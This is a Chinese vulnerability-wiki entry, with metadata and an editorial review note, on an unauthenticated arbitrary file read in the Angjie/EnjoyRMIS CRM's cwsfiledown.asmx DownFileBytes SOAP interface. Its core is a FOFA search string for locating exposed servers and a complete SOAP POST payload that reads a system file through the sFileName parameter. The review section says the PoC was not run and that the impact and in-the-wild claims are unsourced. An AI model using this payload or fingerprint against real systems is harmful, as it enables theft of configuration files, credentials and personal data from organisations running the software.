---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-0f42fdeef0c651916d1bc913"
entity_id: "ve-0f42fdeef0c651916d1bc913"
schema_version: "1"
fofa_unverified: "body="
title: "昂捷CRM cwsfiledown.asmx 任意文件读取漏洞"
product: "昂捷CRM/EnjoyRMIS软件"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "Windows，偏移1长度100；无认证声明，版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%98%82%E6%8D%B7/%E6%98%82%E6%8D%B7CRM%20cwsfiledown.asmx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_status: "unknown"
---

# 昂捷CRM cwsfiledown.asmx 任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：昂捷CRM/EnjoyRMIS软件
- 本文讨论：cwsfiledown.asmx DownFileBytes sFileName读取
- 版本、权限与配置前提：Windows，偏移1长度100；无认证声明，版本未知
- 资料类型：SOAP文件读取PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- CRM软件误归IoT
- 原始SOAP没有代码围栏，Markdown可能把XML当标签吞掉；Content-Length为length占位不能发送
- 在野已知/影响广等表格无出处；iPosition1会少首字节，不能按完整win.ini比较
- fofa元数据截断，修复无版本
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 角色/路径权限、版本/在野证据待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

昂捷CRM cwsfiledown.asmx 接口DownFileBytes实例处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

# 影响版本

昂捷CRM

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="/ClientBin/slEnjoy.App.xap"

POC/EXP：

POST /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/DownFileBytes"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DownFileBytes xmlns="http://tempuri.org/">
      <sFileName>c://windows//win.ini</sFileName>
      <iPosition>1</iPosition>
      <iReadBytesLen>100</iReadBytesLen>
      <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>
    </DownFileBytes>
  </soap:Body>
</soap:Envelope>

![image-20241127222148486](./.resource/昂捷CRMcwsfiledown.asmx任意文件读取漏洞/media/image-20241127222148486.png)


# 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
